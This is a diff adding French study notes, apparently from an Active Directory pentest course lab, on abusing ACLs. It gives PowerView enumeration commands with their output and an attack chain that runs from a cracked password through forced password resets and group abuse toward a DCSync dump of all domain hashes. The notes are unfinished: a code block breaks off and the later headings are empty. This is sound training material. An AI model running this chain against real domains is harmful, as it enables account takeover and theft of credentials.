@@ -3033,3 +3033,115 @@ Nous pouvons utiliser les attaques ACL pour :
 | Droits excessifs des utilisateurs | Nous voyons également couramment des objets utilisateur, ordinateur et groupe avec des droits excessifs dont un client n'est probablement pas conscient. Cela pourrait se produire après une sorte d'installation logicielle (Exchange, par exemple, ajoute de nombreux changements ACL dans l'environnement lors de l'installation) ou une sorte de configuration héritée ou accidentelle qui donne à un utilisateur des droits non intentionnels. Parfois, nous pouvons prendre le contrôle d'un compte qui a été accordé certains droits par commodité ou pour résoudre un problème agaçant plus rapidement. |
 
 Il existe de nombreux autres scénarios d'attaque possibles dans le monde des ACL Active Directory, mais ces trois sont les plus courants. Nous couvrirons l'énumération de ces droits de différentes manières, la réalisation des attaques et le nettoyage après nous-mêmes.
+
+Exemple:
+
+```powershell
+PS C:\htb> $itgroupsid = Convert-NameToSid "Information Technology"
+PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose
+
+AceType               : AccessAllowed
+ObjectDN              : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights : GenericAll
+OpaqueLength          : 0
+ObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-1164
+InheritanceFlags      : ContainerInherit
+BinaryLength          : 36
+IsInherited           : False
+IsCallback            : False
+PropagationFlags      : None
+SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-4016
+AccessMask            : 983551
+AuditFlags            : None
+AceFlags              : ContainerInherit
+AceQualifier          : AccessAllowed
+
+```
+
+```powershell
+PS C:\htb> $adunnsid = Convert-NameToSid adunn 
+PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose
+
+AceQualifier           : AccessAllowed
+ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights  : ExtendedRight
+ObjectAceType          : DS-Replication-Get-Changes-In-Filtered-Set
+ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114
+InheritanceFlags       : ContainerInherit
+BinaryLength           : 56
+AceType                : AccessAllowedObject
+ObjectAceFlags         : ObjectAceTypePresent
+IsCallback             : False
+PropagationFlags       : None
+SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1164
+AccessMask             : 256
+AuditFlags             : None
+IsInherited            : False
+AceFlags               : ContainerInherit
+InheritedObjectAceType : All
+OpaqueLength           : 0
+
+AceQualifier           : AccessAllowed
+ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights  : ExtendedRight
+ObjectAceType          : DS-Replication-Get-Changes
+ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114
+InheritanceFlags       : ContainerInherit
+BinaryLength           : 56
+AceType                : AccessAllowedObject
+ObjectAceFlags         : ObjectAceTypePresent
+IsCallback             : False
+PropagationFlags       : None
+SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1164
+AccessMask             : 256
+AuditFlags             : None
+IsInherited            : False
+AceFlags               : ContainerInherit
+InheritedObjectAceType : All
+OpaqueLength           : 0
+
+<SNIP>
+```
+
+### ACL Abuse Tactics
+
+
+#### Abusing ACLs
+
+🛠️ Attaque Active Directory – Escalade de privilèges
+
+📌 Récapitulatif et Objectifs  
+
+Nous avons le contrôle de l'utilisateur **wley**, dont nous avons récupéré le **hash NTLMv2** en exécutant **Responder** plus tôt.  
+Heureusement, son mot de passe était faible, et nous avons pu le **casser hors ligne avec Hashcat** pour obtenir sa version en clair.  
+
+🎯 Objectif final  
+Prendre le contrôle de l'utilisateur **adunn**, qui peut exécuter l'attaque **DCSync**.  
+Cette attaque nous permettrait d'obtenir tous les **hashs NTLM** des utilisateurs du domaine et d'élever nos privilèges jusqu'à **Domain Admin** ou **Enterprise Admin**, assurant ainsi un accès persistant.  
+
+---
+
+🔗 Chaîne d'attaque  
+
+1. **Utiliser l'utilisateur `wley` pour changer le mot de passe de `damundsen`**  
+2. **S'authentifier en tant que `damundsen` et utiliser les droits `GenericWrite`** pour ajouter un utilisateur contrôlé à **Help Desk Level 1**  
+3. **Exploiter l’appartenance imbriquée aux groupes IT** et utiliser **GenericAll** pour prendre le contrôle de `adunn`  
+
+---
+
+🔹 Étape 1 : Changer le mot de passe de `damundsen`  
+
+Nous devons nous authentifier en tant que `wley` et **forcer le changement du mot de passe** de `damundsen`.  
+
+Si nous sommes déjà connectés en tant que `wley`, nous pouvons sauter cette étape.  
+Sinon, nous devons **ouvrir une console PowerShell** et nous authentifier avec un **objet PSCredential** :
+
+```powershell
+$User = "Domaine\wley"
+$Password = ConvertTo-SecureString "MotDePasseEnClair" -AsPlainText -Force
+$Creds = New-Object System.Management.Automation.PSCredential($User, $Password)
+
+### DCSync
+
+
+## Stacking The Deck
